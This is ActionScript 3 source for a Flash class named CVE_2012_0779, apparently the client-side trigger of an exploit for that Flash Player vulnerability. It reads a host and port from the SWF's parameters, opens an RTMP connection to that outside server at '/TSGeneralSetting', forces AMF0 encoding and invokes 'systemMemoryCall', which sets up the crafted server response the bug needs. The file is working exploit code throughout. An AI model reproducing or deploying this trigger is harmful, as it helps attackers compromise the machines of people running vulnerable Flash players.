package {
    import flash.display.*;
    import flash.utils.*;
    import flash.net.*;
    import flash.system.*;
    import flash.text.*;
    import flash.external.*;

    public class CVE_2012_0779 extends Sprite {
        private var v15:NetConnection;
        private var v16:Responder;
        

        public function CVE_2012_0779(){
			var param:Object = LoaderInfo(this.root.loaderInfo).parameters;
			this.v16 = new Responder(this.v23);
            this.v15 = new NetConnection();
            var _local2 = "rtmp://";
            var _local3 = "/TSGeneralSetting";            
            var _local5 = param["var1"] + ":" + param["var2"];
            var _local4:String = ((_local2 + _local5) + _local3);
            this.v15.connect(_local4);
            this.v15.call("systemMemoryCall", this.v16, "argc");
        }
        
        private function v23(_arg1:Object):void{
        }        
        
        override public function get stage():Stage{
            return super.stage;
        }

        NetConnection.defaultObjectEncoding = ObjectEncoding.AMF0;
    }
}//package
